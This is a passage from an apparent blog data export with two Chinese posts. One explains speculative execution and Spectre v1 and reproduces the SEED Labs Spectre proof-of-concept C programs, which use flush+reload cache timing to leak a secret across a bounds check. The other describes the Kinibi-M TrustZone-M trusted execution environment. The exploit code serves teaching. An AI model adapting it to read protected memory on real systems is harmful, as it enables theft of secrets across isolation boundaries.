title=\"CPU预测执行\"></a>CPU预测执行</h3><p>由于现在CPU的频率提高越来越困难（频率越高，导致温度变高，容易烧坏芯片），CPU普遍采用两中技术来提高cpu执行代码的速度，一种是乱序执行，通过将相互独立的指令并行执行来提高执行的速度（被用在meltdown攻击中）。另一种就是预测执行，它的应用场景是cpu在应用乱序执行机制执行代码时，当遇到一些跳转时（比如条件跳转，间接跳转），如果跳转的产生需要依赖与一些未完成的指令，导致不能马上执行跳转，此时，cpu便会执行预测执行，预测跳转的目的地并继续往下执行。</p>\n<h3 id=\"基于缓存的侧信道攻击\"><a href=\"#基于缓存的侧信道攻击\" class=\"headerlink\" title=\"基于缓存的侧信道攻击\"></a>基于缓存的侧信道攻击</h3><p>flush+reload方法是Yuval Yarom和Katrina Falkner两位大牛在2014年的usenix上提出。程序在访问某一地址内存时，如果该内存之前被访问过，则会放在缓存中，则此次访问会产生一个缓存命中，导致访问速度比一般访问内存快很多。这很大程度提高了计算机访问内存的速度，但也给攻击者带来了可趁之机。攻击者可以扫描内存，对每一次的访问内存进行计时，根据缓存命中与否的访问时间上的差异，可以确定该内存是否被访问过。这个方法针对不同的场景有不同的用法。那两位作者在他们的论文中用这个方法获得了rsa算法的密钥。Spectre用这个方法读取了相关内存的值，具体的会在下面介绍。</p>\n<h2 id=\"Spectre攻击流程\"><a href=\"#Spectre攻击流程\" class=\"headerlink\" title=\"Spectre攻击流程\"></a>Spectre攻击流程</h2><p>Spectre攻击在论文中实施了两种攻击，一种是针对条件跳转的，一种是针对间接跳转的。由于间接跳转的比较复杂，本文就对条件跳转的攻击进行讨论。<br>我们先来看一下代码</p>\n<pre><code>if(x&lt;array1_size){\n    y=array2[array1[x]*4096];\n}\n</code></pre><p>按照程序的正常运行，只有当x满足条件x&lt; array1_size，时，程序才会执行下面的语句，但是当攻击者可以控制预测执行时，攻击者就可以在x&gt; array1_size的情况下使程序执行下面的语句。大家有兴趣的可以用一下代码尝试，该代码取自seedlab中的spectreattack实验。</p>\n<pre><code>#include &lt;emmintrin.h&gt;\n#include &lt;x86intrin.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n\nint size = 10;\nuint8_t array[256*4096];\nuint8_t temp = 0;\n#define CACHE_HIT_THRESHOLD (80)\n#define DELTA 1024\n\nvoid flushSideChannel()\n{\n  int i;\n  // Write to array to bring it to RAM to prevent Copy-on-write\n  for (i = 0; i &lt; 256; i++) array[i*4096 + DELTA] = 1;\n  //flush the values of the array from cache\n  for (i = 0; i &lt; 256; i++) _mm_clflush(&amp;array[i*4096 +DELTA]);\n}\n\nvoid reloadSideChannel()\n{\n  int junk=0;\n  register uint64_t time1, time2;\n  volatile uint8_t *addr;\n  int i;\n  for(i = 0; i &lt; 256; i++){\n    addr = &amp;array[i*4096 + DELTA];\n    time1 = __rdtscp(&amp;junk);\n    junk = *addr;\n    time2 = __rdtscp(&amp;junk) - time1;\n    if (time2 &lt;= CACHE_HIT_THRESHOLD){\n    printf(&quot;array[%d*4096 + %d] is in cache.\\n&quot;, i, DELTA);\n        printf(&quot;The Secret = %d.\\n&quot;,i);\n    }\n  } \n}\n\nvoid victim(size_t x)\n{\n  if (x &lt; size) {  \n  temp = array[x * 4096 + DELTA];  \n  }\n}\n\nint main() {\n  int i;\n  // FLUSH the probing array\n  flushSideChannel();\n  // Train the CPU to take the true branch inside victim()\n  for (i = 0; i &lt; 10; i++) {   \n   _mm_clflush(&amp;size); \n   victim(i);\n  }\n  // Exploit the out-of-order execution\n  _mm_clflush(&amp;size);\n  for (i = 0; i &lt; 256; i++)\n   _mm_clflush(&amp;array[i*4096 + DELTA]); \n  victim(97);  \n  // RELOAD the probing array\n  reloadSideChannel();\n  return (0); \n}</code></pre><p>在上面的victim程序中，x假设是一个我们想要访问的值，之所以要乘4096是为了相邻两个x值之间的距离，防止prefetch机制。DELTA是为了防止一个在i=0时，程序在访问本地变量的时候，cache会一个line大小的数据（包括array[0]）全放入缓存，导致flush过程的失败。</p>\n<p>控制预测执行成功后，我们模拟一个应用场景，比如说在浏览器浏览网页时，不同网页是在一个进程中的，而进程内的隔离一般是通过sandbox技术实现，在sandbox中，常见的隔离手段是通过边界检查，例如下面的代码：</p>\n<pre><code>if (address_want_to_access&lt;permitted_address_size){\n  return memory[address_want_to_access]\n}</code></pre><p>试想，如果我们能够绕过边界检查，把我们要读取的内存作为内存地址放在缓存中，然后再用flush+reload技术获得缓存中存储的内存地址，这样一顿操作后，我们是不是就能读取想要的数据了？<br>我们来看如下代码片段，我们假设我们已经训练好预测执行，victim函数是一个边界检查函数，x是我们想要读取的内存地址，我们调用victim函数并将结果放到数组中进行运算，这是为了将数据能够泄漏到缓存中，使得我们能用flush+reload技术去读取想要读取的数据。</p>\n<pre><code>uint8_t victim(x){\n\n  if(x&lt;buffer_size){\n    return buffer[x]\n  }else{\n    return 0\n  }\n}\n\nint main(){\n  x=address_want_to_read;\n  s=victim(x);               //读取指定数据\n  array[s*4096+DELTA]+=99;//为了访问内存，将数据泄漏到缓存中\n}</code></pre><p>最后附上一个seedlab上spectreattack的一个程序代码</p>\n<pre><code>#include &lt;emmintrin.h&gt;\n#include &lt;x86intrin.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n\nunsigned int buffer_size = 10;\nuint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; \nuint8_t temp = 0;\nchar *secret = &quot;Some Secret Value&quot;;   \nuint8_t array[256*4096];\n\n#define CACHE_HIT_THRESHOLD (80)\n#define DELTA 1024\n\n// Sandbox Function\nuint8_t restrictedAccess(size_t x)\n{\n  if (x &lt; buffer_size) {\n     return buffer[x];\n  } else {\n     return 0;\n  } \n}\n\nvoid flushSideChannel()\n{\n  int i;\n  // Write to array to bring it to RAM to prevent Copy-on-write\n  for (i = 0; i &lt; 256; i++) array[i*4096 + DELTA] = 1;\n  //flush the values of the array from cache\n  for (i = 0; i &lt; 256; i++) _mm_clflush(&amp;array[i*4096 +DELTA]);\n}\n\nvoid reloadSideChannel()\n{\n  int junk=0;\n  register uint64_t time1, time2;\n  volatile uint8_t *addr;\n  int i;\n  for(i = 0; i &lt; 256; i++){\n    addr = &amp;array[i*4096 + DELTA];\n    time1 = __rdtscp(&amp;junk);\n    junk = *addr;\n    time2 = __rdtscp(&amp;junk) - time1;\n    if (time2 &lt;= CACHE_HIT_THRESHOLD){\n    printf(&quot;array[%d*4096 + %d] is in cache.\\n&quot;, i, DELTA);\n        printf(&quot;The Secret = %d.\\n&quot;,i);\n    }\n  } \n}\nvoid spectreAttack(size_t larger_x)\n{\n  int i;\n  uint8_t s;\n  volatile int z;\n  // Train the CPU to take the true branch inside restrictedAccess().\n  for (i = 0; i &lt; 10; i++) { \n   _mm_clflush(&amp;buffer_size);\n   restrictedAccess(i); \n  }\n  // Flush buffer_size and array[] from the cache.\n  _mm_clflush(&amp;buffer_size);\n  for (i = 0; i &lt; 256; i++)  { _mm_clflush(&amp;array[i*4096 + DELTA]); }\n  for (z = 0; z &lt; 100; z++) { }\n  // Ask restrictedAccess() to return the secret in out-of-order execution. \n  s = restrictedAccess(larger_x);  \n  array[s*4096 + DELTA] += 88;  \n}\n\nint main() {\n  flushSideChannel();\n  size_t larger_x = (size_t)(secret - (char*)buffer);  \n  spectreAttack(larger_x);\n  reloadSideChannel();\n  return (0);\n}</code></pre><p><a href=\"https://seedsecuritylabs.org/Labs_16.04/PDF/Spectre_Attack.pdf\" target=\"_blank\" rel=\"noopener\">关于seedlab的spectre attack详细介绍请看</a></p>\n<p>以上就是spectre的基本思想，论述的不清楚的地方请大家多多见谅,欢迎大家与我一起交流学习</p>\n"},{"title":"Kinibi-M Introduction","date":"2020-09-24T07:00:00.000Z","catalog":true,"subtitle":null,"header-img":null,"top":false,"_content":" \n\n# Overview\n\nKinibi-M 是一个可移植的可信执行环境（Trusted Execution Environment），用于在设备上执行可信的应用程序。它包括内建的**密码算法**和**安全数据存储**。它可以被集成到支持ARM TrustZone-M的不同微处理器上。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/overview.png\" alt=\"\" /><br>\n\nKinibi-M 利用TrustZone-M 以及 secure gateway 来与传统的 non-secure 应用进行隔离<br>\n\nSecure-World 包括 Kinibi-M Bootloader 以及带有多个安全模块的 Kinibi-M 操作系统，可以为 Non-Secure World 中的应用程序提供安全的功能。Non-Secure World 包括主要的应用程序以及调用安全模块的接口。\n\nKinibi-M 含有一个设备唯一的密钥，它是设备出厂时由制造商安装的。它可以为Kinibi-M系统提供消息证明的功能。证明的消息可以被 Trustonic 的云服务商认证， 说明该消息来自一个已知的设备。\n\nKinibi-M API 主要利用 ARM TrustZone-M 中的 NSC(non-secure callable memory) 实现。Kinibi-M 在NSC中使用了一个 **single entry** 来保证 Secure 和 Non-secure 之间的隔离。API 相当于一个 Secure World 与 Non-secure World 之间的交互通道，为 non-secure 中的应用程序提供了接口，应用程序给 API 发送命令， API负责将命令交给 Secure World 中的安全模块。\n\n在 Secure World 中，Kinibi-M 提供了安全模块 API 接口，用于开发安全模块。 一个安全模块一般在安全 flash 中运行， 并且只能访问它所在头文件中定义的安全的资源。 安全模块的初始化过程是在 Kinibi-M 系统的 boot 阶段，一旦启动后就可以处理 Non-secure World 应用程序的命令请求。\n\n## Global Architecture Overview\n<img style=\"display: block; margin: 0 auto;\" src=\"images/global_overview.jpg\" alt=\"\" /><br>\n\n当一个 Non-secure World 应用程序传入命令参数并调用 Kinibi-M 的安全模块时，首先进入位于NSC内存中的 Secure Gateway ，然后进入 Secure World 中的 Kinibi-M 内核，内核根据命令参数选择安全模块。由于每个安全模块都是运行在低权限模式下，内核将权限从高权限降到低权限，并将命令参数传给响应的模块进行处理。处理结束后，安全模块通过系统调用回到 Kinibi-M 内核并由内核切换到 Non-secure World 的应用程序。\n\n当有一个安全模块发送命令给另外一个安全模块时，先是通过系统调用交给 Kinibi-M 内核。内核识别发送命令的安全模块并将命令参数交给需要接受的安全模块。\n\nKinibi-M 通过配置内存保护单元(MPU)对不同的安全模块进行隔离。每个安全模块可以访问它自己的代码和它的栈，但是不能读取其他安全模块的代码与栈。如果安全模块之间需要访问外设，该模块必须向内核声明该外设的地址来获得指定外设的访问权限。\n\n## Secure Module Manifest Overview\nKinibi-M 安全模块需要包括一个C的头文件，该头文件定义安全模块的ID以及一个清单。清单包含所属安全模块需要访问的资源。资源可以是：\n\n* 一段内存区域\n* 中断号\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/manifest.jpg\" alt=\"\" /><br>\n\n\n当 Kinibi-M 将所有的安全模块启动之后，不同的模块不能访问同一个资源除非该资源被标记为 shared。Kinibi-M 保留一些系统内存资源以防安全模块对其访问来保证其安全性，比如 secure bootloader 内存区域。\n\n下图展示了一个安全模块的头文件样例，在该文件中，安全模块声明了一个安全的PORT外设(地址区间为0x40003200-0x40003400)。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/secure_module_manifest.jpg\" alt=\"\" /><br>\n\n## Secure Module Command Overview\n\n安全模块的 Command Interface 由一个 invoke_entry 的回调函数构成。命令参数包括Command ID 以及操作结构体。Command ID 是安全模块定义的一个32 bit 的值。操作结构体包含至多四个参数，如下图所示：\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/secure_module_command_overview.jpg\" alt=\"\" /><br>\n\n每个参数可以是value类型或者buffer类型，也可以不使用：\n* value：包含两个32 bit 的值\n* buffer：包含一个指针和一个大小\n  \n每个安全模块可以任意选择它所需要的参数的类型。参数可以是输入类型，输出类型或者输入输出类型。对于一个输入的buffer类型参数，安全模块只能读取，但是无法修改它。而输出类型的buffer类型参数可以被安全模块修改，包括内容和大小。输入输出类型的参数可以被安全模块读写。\n\n安全模块可以接受命令输入参数并返回命令输出参数。它必须返回 32 bit 的值来表示命令调用结果(调用成功，未实现，调用失败)\n\n在转发命令参数的过程中，Kinibi-M内核先检查操作结构体中的参数，以确保其安全性。比如，Kinibi-M 检查发送方的命令参数是否访问的是该模块所允许访问的资源，如果这个命令是从 Non-secure World 发起，Kinibi-M 需要保证其参数中没有对 Secure World 内存的引用。\n\nKinibi-M 通过配置 MPU 来为被调用的安全模块开启对 buffer 参数的访问权限。因为 MPU 已经被用来隔离代码和栈，所以当MPU的区域数达到上限时，Kinibi-M 必须将参数拷贝到栈中。以下框图显示了一个安全模块用MPU来处理命令参数。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/command_handle_memory layout.jpg\" alt=\"\" /><br>\n\n在上图中，左边展示的是最好的情况，即所有的命令参数都能被 MPU 所保护起来。在右边第二种情况下，Kinibi-M 已经用了 MPU 中的四个区域，所以需要拷贝第二个 buffer 参数到安全模块的栈中。\n\n\n另外，除了安全模块的代码和栈所用到的 MPU 的区域块，其他的区域块可能会被 Kinibi-M 模块用来允许安全模块访问其头文件中定义的内存资源。\n\n当 Kinibi-M 必须要拷贝操作结构体到安全模块的栈中时，依旧能保证安全和隔离性，但是会影响性能。拷贝的时间取决于 buffer 参数的大小。SAML11 有四个 MPU 区域块，两个被安全模块的代码和栈所使用，剩下两个用来传递参数。需要注意的是，一旦安全模块声明需要访问内存资源，一个区域块就会被用来作为指定内存资源的访问控制，所以只留下一个区域块用来传递参数的引用。当区域块不够时，后面的参数会被拷贝。\n\n## Interrupt Handling Overview\n\n当一个 Kinibi-M 的安全模块想要处理中断时，它必须在自己的资源清单中声明所要处理的中断号。一旦被声明， Kinibi-M 会将该中断分配给 Secure World，该中断就不能被 non-secure world 所访问。\n当安全模块在清单里声明中断号之后，一旦一个中断发生，Kinibi-M 会请求安全模块的命令处理模块。命令处理模块能够通过命令参数分辨出该请求是中断处理请求还是普通调用请求。在中断请求的命令参数中，操作值不再是四个参数的指针，而是等于中断号。因此，安全模块可以根据中断号来处理不同的中断。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/secure_interrupt_handler.jpg\" alt=\"\" /><br>\n\n当安全模块处理中断请求时，它的权限和处理普通调用请求一样。\n\n因为要配置 MPU 来保证安全模块的隔离性，Kinibi-M 内核在收到 MCU 的中断请求后请求安全模块的命令处理的过程中会引入额外的开销。在处理中断之前设置安全保护措施的时间大概需要400个时钟周期。\n\n## Invoke Command Benchmark\n\n在一个 Non-secure 的应用调用一个安全模块的过程中或者安全模块调用安全模块的过程中，由于命令的调用需要进行上下文的切换，所以会产生一定的开销。\n\n### Non-secure Application Calling Invoke command\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/non_call_secure.jpg\" alt=\"\" /><br>\n\n\n### Secure Module Calling Invoke command\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/secure_secure.jpg\" alt=\"\" /><br>\n\n## Invoke Command Handle Process\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/invoke_command_process.jpg\" alt=\"\" /><br>\n\n## Basic Non-secure Application Implementation\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/basic_non_secure_application.jpg\" alt=\"\" /><br>\n\n","source":"_posts/kinibi_introduction.md","raw":"---\ntitle: Kinibi-M Introduction\ndate: 2020.9.24\ncatalog: true\nsubtitle: \nheader-img: \ntop: false\ntags: OS\ncategories: MCU \n---\n \n\n# Overview\n\nKinibi-M 是一个可移植的可信执行环境（Trusted Execution Environment），用于在设备上执行可信的应用程序。它包括内建的**密码算法**和**安全数据存储**。它可以被集成到支持ARM TrustZone-M的不同微处理器上。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/overview.png\" alt=\"\" /><br>\n\nKinibi-M 利用TrustZone-M 以及 secure gateway 来与传统的 non-secure 应用进行隔离<br>\n\nSecure-World 包括 Kinibi-M Bootloader 以及带有多个安全模块的 Kinibi-M 操作系统，可以为 Non-Secure World 中的应用程序提供安全的功能。Non-Secure World 包括主要的应用程序以及调用安全模块的接口。\n\nKinibi-M 含有一个设备唯一的密钥，它是设备出厂时由制造商安装的。它可以为Kinibi-M系统提供消息证明的功能。证明的消息可以被 Trustonic 的云服务商认证， 说明该消息来自一个已知的设备。\n\nKinibi-M API 主要利用 ARM TrustZone-M 中的 NSC(non-secure callable memory) 实现。Kinibi-M 在NSC中使用了一个 **single entry** 来保证 Secure 和 Non-secure 之间的隔离。API 相当于一个 Secure World 与 Non-secure World 之间的交互通道，为 non-secure 中的应用程序提供了接口，应用程序给 API 发送命令， API负责将命令交给 Secure World 中的安全模块。\n\n在 Secure World 中，Kinibi-M 提供了安全模块 API 接口，用于开发安全模块。 一个安全模块一般在安全 flash 中运行， 并且只能访问它所在头文件中定义的安全的资源。 安全模块的初始化过程是在 Kinibi-M 系统的 boot 阶段，一旦启动后就可以处理 Non-secure World 应用程序的命令请求。\n\n## Global Architecture Overview\n<img style=\"display: block; margin: 0 auto;\" src=\"images/global_overview.jpg\" alt=\"\" /><br>\n\n当一个 Non-secure World 应用程序传入命令参数并调用 Kinibi-M 的安全模块时，首先进入位于NSC内存中的 Secure Gateway ，然后进入 Secure World 中的 Kinibi-M 内核，内核根据命令参数选择安全模块。由于每个安全模块都是运行在低权限模式下，内核将权限从高权限降到低权限，并将命令参数传给响应的模块进行处理。处理结束后，安全模块通过系统调用回到 Kinibi-M 内核并由内核切换到 Non-secure World 的应用程序。\n\n当有一个安全模块发送命令给另外一个安全模块时，先是通过系统调用交给 Kinibi-M 内核。内核识别发送命令的安全模块并将命令参数交给需要接受的安全模块。\n\nKinibi-M 通过配置内存保护单元(MPU)对不同的安全模块进行隔离。每个安全模块可以访问它自己的代码和它的栈，但是不能读取其他安全模块的代码与栈。如果安全模块之间需要访问外设，该模块必须向内核声明该外设的地址来获得指定外设的访问权限。\n\n## Secure Module Manifest Overview\nKinibi-M 安全模块需要包括一个C的头文件，该头文件定义安全模块的ID以及一个清单。清单包含所属安全模块需要访问的资源。资源可以是：\n\n* 一段内存区域\n* 中断号\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/manifest.jpg\" alt=\"\" /><br>\n\n\n当 Kinibi-M 将所有的安全模块启动之后，不同的模块不能访问同一个资源除非该资源被标记为 shared。Kinibi-M 保留一些系统内存资源以防安全模块对其访问来保证其安全性，比如 secure bootloader 内存区域。\n\n下图展示了一个安全模块的头文件样例，在该文件中，安全模块声明了一个安全的PORT外设(地址区间为0x40003200-0x40003400)。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/secure_module_manifest.jpg\" alt=\"\" /><br>\n\n## Secure Module Command Overview\n\n安全模块的 Command Interface 由一个 invoke_entry 的回调函数构成。命令参数包括Command ID 以及操作结构体。Command ID 是安全模块定义的一个32 bit 的值。操作结构体包含至多四个参数，如下图所示：\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/secure_module_command_overview.jpg\" alt=\"\" /><br>\n\n每个参数可以是value类型或者buffer类型，也可以不使用：\n* value：包含两个32 bit 的值\n* buffer：包含一个指针和一个大小\n  \n每个安全模块可以任意选择它所需要的参数的类型。参数可以是输入类型，输出类型或者输入输出类型。对于一个输入的buffer类型参数，安全模块只能读取，但是无法修改它。而输出类型的buffer类型参数可以被安全模块修改，包括内容和大小。输入输出类型的参数可以被安全模块读写。\n\n安全模块可以接受命令输入参数并返回命令输出参数。它必须返回 32 bit 的值来表示命令调用结果(调用成功，未实现，调用失败)\n\n在转发命令参数的过程中，Kinibi-M内核先检查操作结构体中的参数，以确保其安全性。比如，Kinibi-M 检查发送方的命令参数是否访问的是该模块所允许访问的资源，如果这个命令是从 Non-secure World 发起，Kinibi-M 需要保证其参数中没有对 Secure World 内存的引用。\n\nKinibi-M 通过配置 MPU 来为被调用的安全模块开启对 buffer 参数的访问权限。因为 MPU 已经被用来隔离代码和栈，所以当MPU的区域数达到上限时，Kinibi-M 必须将参数拷贝到栈中。以下框图显示了一个安全模块用MPU来处理命令参数。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/command_handle_memory layout.jpg\" alt=\"\" /><br>\n\n在上图中，左边展示的是最好的情况，即所有的命令参数都能被 MPU 所保护起来。在右边第二种情况下，Kinibi-M 已经用了 MPU 中的四个区域，所以需要拷贝第二个 buffer 参数到安全模块的栈中。\n\n\n另外，除了安全模块的代码和栈所用到的 MPU 的区域块，其他的区域块可能会被 Kinibi-M 模块用来允许安全模块访问其头文件中定义的内存资源。\n\n当 Kinibi-M 必须要拷贝操作结构体到安全模块的栈中时，依旧能保证安全和隔离性，但是会影响性能。拷贝的时间取决于 buffer 参数的大小。SAML11 有四个 MPU 区域块，两个被安全模块的代码和栈所使用，剩下两个用来传递参数。需要注意的是，一旦安全模块声明需要访问内存资源，一个区域块就会被用来作为指定内存资源的访问控制，所以只留下一个区域块用来传递参数的引用。当区域块不够时，后面的参数会被拷贝。\n\n## Interrupt Handling Overview\n\n当一个 Kinibi-M 的安全模块想要处理中断时，它必须在自己的资源清单中声明所要处理的中断号。一旦被声明， Kinibi-M 会将该中断分配给 Secure World，该中断就不能被 non-secure world 所访问。\n当安全模块在清单里声明中断号之后，一旦一个中断发生，Kinibi-M 会请求安全模块的命令处理模块。命令处理模块能够通过命令参数分辨出该请求是中断处理请求还是普通调用请求。在中断请求的命令参数中，操作值不再是四个参数的指针，而是等于中断号。因此，安全模块可以根据中断号来处理不同的中断。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/secure_interrupt_handler.jpg\" alt=\"\" /><br>\n\n当安全模块处理中断请求时，它的权限和处理普通调用请求一样。\n\n因为要配置 MPU 来保证安全模块的隔离性，Kinibi-M 内核在收到 MCU 的中断请求后请求安全模块的命令处理的过程中会引入额外的开销。在处理中断之前设置安全保护措施的时间大概需要400个时钟周期。\n\n## Invoke Command Benchmark\n\n在一个 Non-secure 的应用调用一个安全模块的过程中或者安全模块调用安全模块的过程中，由于命令的调用需要进行上下文的切换，所以会产生一定的开销。\n\n### Non-secure Application Calling Invoke command\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/non_call_secure.jpg\" alt=\"\" /><br>\n\n\n### Secure Module Calling Invoke command\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/secure_secure.jpg\" alt=\"\" /><br>\n\n## Invoke Command Handle Process\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/invoke_command_process.jpg\" alt=\"\" /><br>\n\n## Basic Non-secure Application Implementation\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/basic_non_secure_application.jpg\" alt=\"\" /><br>\n\n","slug":"kinibi_introduction","published":1,"updated":"2020-10-04T05:11:18.629Z","_id":"ckfun9itw0000jzjx5ohr7asz","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h1><p>Kinibi-M 是一个可移植的可信执行环境（Trusted Execution Environment），用于在设备上执行可信的应用程序。它包括内建的<strong>密码算法</strong>和<strong>安全数据存储</strong>。它可以被集成到支持ARM TrustZone-M的不同微处理器上。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/overview.png\" alt><br></p>\n<p>Kinibi-M 利用TrustZone-M 以及 secure gateway 来与传统的 non-secure 应用进行隔离<br></p>\n<p>Secure-World 包括 Kinibi-M Bootloader 以及带有多个安全模块的 Kinibi-M 操作系统，可以为 Non-Secure World 中的应用程序提供安全的功能。Non-Secure World 包括主要的应用程序以及调用安全模块的接口。</p>\n<p>Kinibi-M 含有一个设备唯一的密钥，它是设备出厂时由制造商安装的。它可以为Kinibi-M系统提供消息证明的功能。证明的消息可以被 Trustonic 的云服务商认证， 说明该消息来自一个已知的设备。</p>\n<p>Kinibi-M API 主要利用 ARM TrustZone-M 中的 NSC(non-secure callable memory) 实现。Kinibi-M 在NSC中使用了一个 <strong>single entry</strong> 来保证 Secure 和 Non-secure 之间的隔离。API 相当于一个 Secure World 与 Non-secure World 之间的交互通道，为 non-secure 中的应用程序提供了接口，应用程序给 API 发送命令， API负责将命令交给 Secure World 中的安全模块。</p>\n<p>在 Secure World 中，Kinibi-M 提供了安全模块 API 接口，用于开发安全模块。 一个安全模块一般在安全 flash 中运行， 并且只能访问它所在头文件中定义的安全的资源。 安全模块的初始化过程是在 Kinibi-M 系统的 boot 阶段，一旦启动后就可以处理 Non-secure World 应用程序的命令请求。</p>\n<h2 id=\"Global-Architecture-Overview\"><a href=\"#Global-Architecture-Overview\" class=\"headerlink\" title=\"Global Architecture Overview\"></a>Global Architecture Overview</h2><p><img style=\"display: block; margin: 0 auto;\" src=\"images/global_overview.jpg\" alt><br></p>\n<p>当一个 Non-secure World 应用程序传入命令参数并调用 Kinibi-M 的安全模块时，首先进入位于NSC内存中的 Secure Gateway ，然后进入 Secure World 中的 Kinibi-M 内核，内核根据命令参数选择安全模块。由于每个安全模块都是运行在低权限模式下，内核将权限从高权限降到低权限，并将命令参数传给响应的模块进行处理。处理结束后，安全模块通过系统调用回到 Kinibi-M 内核并由内核切换到 Non-secure World 的应用程序。</p>\n<p>当有一个安全模块发送命令给另外一个安全模块时，先是通过系统调用交给 Kinibi-M 内核。内核识别发送命令的安全模块并将命令参数交给需要接受的安全模块。</p>\n<p>Kinibi-M 通过配置内存保护单元(MPU)对不同的安全模块进行隔离。每个安全模块可以访问它自己的代码和它的栈，但是不能读取其他安全模块的代码与栈。如果安全模块之间需要访问外设，该模块必须向内核声明该外设的地址来获得指定外设的访问权限。</p>\n<h2 id=\"Secure-Module-Manifest-Overview\"><a href=\"#Secure-Module-Manifest-Overview\" class=\"headerlink\" title=\"Secure Module Manifest Overview\"></a>Secure Module Manifest Overview</h2><p>Kinibi-M 安全模块需要包括一个C的头文件，该头文件定义安全模块的ID以及一个清单。清单包含所属安全模块需要访问的资源。资源可以是：</p>\n<ul>\n<li>一段内存区域</li>\n<li>中断号</li>\n</ul>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/manifest.jpg\" alt><br></p>\n<p>当 Kinibi-M 将所有的安全模块启动之后，不同的模块不能访问同一个资源除非该资源被标记为 shared。Kinibi-M 保留一些系统内存资源以防安全模块对其访问来保证其安全性，比如 secure bootloader 内存区域。</p>\n<p>下图展示了一个安全模块的头文件样例，在该文件中，安全模块声明了一个安全的PORT外设(地址区间为0x40003200-0x40003400)。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/secure_module_manifest.jpg\" alt><br></p>\n<h2 id=\"Secure-Module-Command-Overview\"><a href=\"#Secure-Module-Command-Overview\" class=\"headerlink\" title=\"Secure Module Command Overview\"></a>Secure Module Command Overview</h2><p>安全模块的 Command Interface 由一个 invoke_entry 的回调函数构成。命令参数包括Command ID 以及操作结构体。Command ID 是安全模块定义的一个32 bit 的值。操作结构体包含至多四个参数，如下图所示：</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/secure_module_command_overview.jpg\" alt><br></p>\n<p>每个参数可以是value类型或者buffer类型，也可以不使用：</p>\n<ul>\n<li>value：包含两个32 bit 的值</li>\n<li>buffer：包含一个指针和一个大小</li>\n</ul>\n<p>每个安全模块可以任意选择它所需要的参数的类型。参数可以是输入类型，输出类型或者输入输出类型。对于一个输入的buffer类型参数，安全模块只能读取，但是无法修改它。而输出类型的buffer类型参数可以被安全模块修改，包括内容和大小。输入输出类型的参数可以被安全模块读写。</p>\n<p>安全模块可以接受命令输入参数并返回命令输出参数。它必须返回 32 bit 的值来表示命令调用结果(调用成功，未实现，调用失败)</p>\n<p>在转发命令参数的过程中，Kinibi-M内核先检查操作结构体中的参数，以确保其安全性。比如，Kinibi-M 检查发送方的命令参数是否访问的是该模块所允许访问的资源，如果这个命令是从 Non-secure World 发起，Kinibi-M 需要保证其参数中没有对 Secure World 内存的引用。</p>\n<p>Kinibi-M 通过配置 MPU 来为被调用的安全模块开启对 buffer 参数的访问权限。因为 MPU 已经被用来隔离代码和栈，所以当MPU的区域数达到上限时，Kinibi-M 必须将参数拷贝到栈中。以下框图显示了一个安全模块用MPU来处理命令参数。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/command_handle_memory layout.jpg\" alt><br></p>\n<p>在上图中，左边展示的是最好的情况，即所有的命令参数都能被 MPU 所保护起来。在右边第二种情况下，Kinibi-M 已经用了 MPU 中的四个区域，所以需要拷贝第二个 buffer 参数到安全模块的栈中。</p>\n<p>另外，除了安全模块的代码和栈所用到的 MPU 的区域块，其他的区域块可能会被 Kinibi-M 模块用来允许安全模块访问其头文件中定义的内存资源。</p>\n<p>当 Kinibi-M 必须要拷贝操作结构体到安全模块的栈中时，依旧能保证安全和隔离性，但是会影响性能。拷贝的时间取决于 buffer 参数的大小。SAML11 有四个 MPU 区域块，两个被安全模块的代码和栈所使用，剩下两个用来传递参数。需要注意的是，一旦安全模块声明需要访问内存资源，一个区域块就会被用来作为指定内存资源的访问控制，所以只留下一个区域块用来传递参数的引用。当区域块不够时，后面的参数会被拷贝。</p>\n<h2 id=\"Interrupt-Handling-Overview\"><a href=\"#Interrupt-Handling-Overview\" class=\"headerlink\" title=\"Interrupt Handling Overview\"></a>Interrupt Handling Overview</h2><p>当一个 Kinibi-M 的安全模块想要处理中断时，它必须在自己的资源清单中声明所要处理的中断号。一旦被声明， Kinibi-M 会将该中断分配给 Secure World，该中断就不能被 non-secure world 所访问。<br>当安全模块在清单里声明中断号之后，一旦一个中断发生，Kinibi-M 会请求安全模块的命令处理模块。命令处理模块能够通过命令参数分辨出该请求是中断处理请求还是普通调用请求。在中断请求的命令参数中，操作值不再是四个参数的指针，而是等于中断号。因此，安全模块可以根据中断号来处理不同的中断。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/secure_interrupt_handler.jpg\" alt><br></p>\n<p>当安全模块处理中断请求时，它的权限和处理普通调用请求一样。</p>\n<p>因为要配置 MPU 来保证安全模块的隔离性，Kinibi-M 内核在收到 MCU 